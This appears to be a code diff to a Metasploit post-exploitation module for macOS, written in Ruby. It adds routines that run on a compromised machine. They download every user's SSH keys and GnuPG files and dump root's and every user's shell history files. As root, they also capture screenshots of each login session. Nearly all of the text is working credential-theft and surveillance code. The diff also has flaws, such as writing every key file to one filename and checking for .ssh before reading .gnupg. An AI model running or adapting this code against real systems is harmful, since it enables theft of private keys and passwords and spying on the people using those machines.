@@ -57,6 +57,8 @@ class Metasploit3 < Msf::Post
 		get_crypto_keys(log_folder)
 		screenshot(log_folder, ver_num)
 		dump_hash(log_folder,ver_num) if running_root
+		dump_bash_history(log_folder)
+
 	end
 
 	# Function for creating the folder for gathered data
@@ -126,11 +128,6 @@ class Metasploit3 < Msf::Post
 			osx_ver_num = session.shell_command_token("/usr/bin/sw_vers -productVersion").chomp
 		end
 
-		if osx_ver_num =~ /10\.(6|5)\.\d/
-			ver = "L"
-		else
-			ver = "T"
-		end
 
 		return osx_ver_num
 	end
@@ -156,7 +153,7 @@ class Metasploit3 < Msf::Post
 		shell_commands = {
 			"TCP Connections" => ["/usr/sbin/netstat","-np tcp"],
 			"UDP Connections" => ["/usr/sbin/netstat","-np udp"],
-			"Enviroment Variables" => ["/usr/bin/printenv",""],
+			"Environment Variables" => ["/usr/bin/printenv",""],
 			"Last Boottime" => ["/usr/bin/who","-b"],
 			"Current Activity" => ["/usr/bin/who",""],
 			"Process List" => ["/bin/ps","-ea"]
@@ -296,6 +293,52 @@ class Metasploit3 < Msf::Post
 						file_local_write(log_folder+"//#{name}",gpg_file_content)
 					end
 				end
+			else
+				users = []
+				case session.type
+				when /meterpreter/
+					users_folder = cmd_exec("/bin/ls","/Users")
+				when /shell/
+					users_folder = session.shell_command_token("/bin/ls /Users")
+				end
+				users_folder.each_line do |u|
+					next if u.chomp =~ /Shared|\.localized/
+					users << u.chomp
+				end
+
+				users.each do |u|
+					user_folder = session.shell_command_token("/bin/ls -ma /Users/#{u}/").chomp.split(", ")
+					if user_folder.include?("\.ssh")
+						print_status(".ssh Folder is present for #{u}")
+						ssh_folder = session.shell_command_token("/bin/ls -ma /Users/#{u}/.ssh").chomp.split(", ")
+						ssh_folder.each do |k|
+							next if k =~/^\.$|^\.\.$/
+							print_status("\tDownloading #{k.strip}")
+							ssh_file_content = session.shell_command_token("/bin/cat /Users/#{u}/.ssh/#{k}")
+
+							# Save data lo log folder
+							file_local_write(log_folder+"//#{name}",ssh_file_content)
+						end
+					end
+				end
+
+
+				users.each do |u|
+					user_folder = session.shell_command_token("/bin/ls -ma /Users/#{u}/").chomp.split(", ")
+					if user_folder.include?("\.ssh")
+						print_status(".gnupg Folder is present for #{u}")
+						ssh_folder = session.shell_command_token("/bin/ls -ma /Users/#{u}/.gnupg").chomp.split(", ")
+						ssh_folder.each do |k|
+							next if k =~/^\.$|^\.\.$/
+							print_status("\tDownloading #{k.strip}")
+							ssh_file_content = session.shell_command_token("/bin/cat /Users/#{u}/.gnupg/#{k}")
+
+							# Save data lo log folder
+							file_local_write(log_folder+"//#{name}",ssh_file_content)
+						end
+					end
+				end
+
 			end
 		end
 	end
@@ -304,18 +347,97 @@ class Metasploit3 < Msf::Post
 	def screenshot(log_folder, ver_num)
 		if ver_num =~ /10\.(6|5)/
 			print_status("Capturing screenshot")
-
-			# Run commands according to the session type
-			if session.type =~ /shell/
-				session.shell_command_token("/usr/sbin/screencapture -x /tmp/screenshot.jpg")
-				file_local_write(log_folder+"//screenshot.jpg",
-					session.shell_command_token("/bin/cat /tmp/screenshot.jpg"))
-				session.shell_command_token("/bin/rm /tmp/screenshot.jpg")
-				print_status("Screenshot Captured")
+			picture_name = ::Time.now.strftime("%Y%m%d.%M%S")
+			if check_root
+				print_status("Capturing screenshot for each loginwindow process since privilage is root")
+				if session.type =~ /shell/
+					loginwindow_pids = session.shell_command_token("/bin/ps aux \| /usr/bin/awk \'/name/ \&\& \!/awk/ \{print \$2\}\'").split("\n")
+					loginwindow_pids.each do |pid|
+						print_status("\tCapturing for PID:#{pid}")
+						session.shell_command_token("/bin/launchctl bsexec #{pid} /usr/sbin/screencapture -x /tmp/#{pid}.jpg")
+						file_local_write(log_folder+"//screenshot_#{pid}.jpg",
+						session.shell_command_token("/bin/cat /tmp/#{pid}.jpg"))
+						session.shell_command_token("/bin/rm /tmp/#{pid}.jpg")
+					end
+				end
+			else
+				# Run commands according to the session type
+				if session.type =~ /shell/
+					session.shell_command_token("/usr/sbin/screencapture -x /tmp/#{picture_name}.jpg")
+					file_local_write(log_folder+"//screenshot.jpg",
+					session.shell_command_token("/bin/cat /tmp/#{picture_name}.jpg"))
+					session.shell_command_token("/bin/rm /tmp/#{picture_name}.jpg")
+				end
 			end
+			print_status("Screenshot Captured")
+
 		end
 	end
 
+	def dump_bash_history(log_folder)
+		print_status("Extracting bash history")
+		# Run commands according to the session type
+		users = []
+		case session.type
+		when /meterpreter/
+			users_folder = cmd_exec("/bin/ls","/Users").chomp
+			current_user = cmd_exec("/usr/bin/id","-nu").chomp
+		when /shell/
+			users_folder = session.shell_command_token("/bin/ls /Users").chomp
+			current_user = session.shell_command_token("/usr/bin/id -nu").chomp
+		end
+		users_folder.each_line do |u|
+			next if u.chomp =~ /Shared|\.localized/
+			users << u.chomp
+		end
+
+		# If we are root lets get root for when sudo was used and all users
+		if current_user == "root"
+
+			# Check the root user folder
+			root_folder = session.shell_command_token("/bin/ls -ma ~/").chomp.split(", ")
+			root_folder.each do |f|
+				if f =~ /\.\w*\_history/
+					print_status("\tHistory file #{f.strip} found for root")
+					print_status("\tDownloading #{f.strip}")
+					sh_file = session.shell_command_token("/bin/cat ~/#{f.strip}")
+
+					# Save data lo log folder
+					file_local_write(log_folder+"//root_#{f.strip}.txt",sh_file)
+				end
+			end
+
+			# Getting the history files for all users
+			users.each do |u|
+
+				# Lets get a list of all the files on the users folder and place them in an array
+				user_folder = session.shell_command_token("/bin/ls -ma /Users/#{u}/").chomp.split(", ")
+				user_folder.each do |f|
+					if f =~ /\.\w*\_history/
+						print_status("\tHistory file #{f.strip} found for #{u}")
+						print_status("\tDownloading #{f.strip}")
+						sh_file = session.shell_command_token("/bin/cat /Users/#{u}/#{f.strip}")
+
+						# Save data lo log folder
+						file_local_write(log_folder+"//#{u}_#{f.strip}.txt",sh_file)
+					end
+				end
+			end
+
+		else
+			current_user_folder = session.shell_command_token("/bin/ls -ma ~/").chomp.split(", ")
+			current_user_folder.each do |f|
+				if f =~ /\.\w*\_history/
+					print_status("\tHistory file #{f.strip} found for #{current_user}")
+					print_status("\tDownloading #{f.strip}")
+					sh_file = session.shell_command_token("/bin/cat ~/#{f.strip}")
+
+					# Save data lo log folder
+					file_local_write(log_folder+"//#{current_user}_#{f.strip}.txt",sh_file)
+				end
+			end
+		end
+	end
 	# Dump SHA1 Hashes used by OSX, must be root to get the Hashes
 	def dump_hash(log_folder,ver_num)
 		print_status("Dumping Hashes")
